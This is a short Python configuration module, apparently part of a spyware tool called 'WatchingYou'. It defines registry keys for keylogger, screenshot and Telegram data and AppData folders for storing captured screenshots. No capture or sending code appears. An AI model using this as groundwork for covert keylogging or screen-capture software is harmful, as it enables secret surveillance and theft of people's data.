from getpass import getuser

__path = 'HKEY_CURRENT_USER\\SOFTWARE\\WatchingYou' + '\\'
__folder = 'Data' + '\\'

REG_KEYLOGGER = __path + __folder + r'K'
REG_SCREENSHOT = __path + __folder + r'S'
REG_TELEGRAM = __path + __folder + r'B'
REG_CONFIG_ALL = __path + __folder

USERNAME = str(getuser())

SUB_PATH_SOFTWARE = 'C:\\Users' + '\\' + USERNAME + r'\AppData\Local\WatchingYou\temp'

PATH_TEMP_SCREENSHOT = 'C:\\Users' + '\\' + USERNAME + r'\AppData\Local\WatchingYou\temp\screenshots'

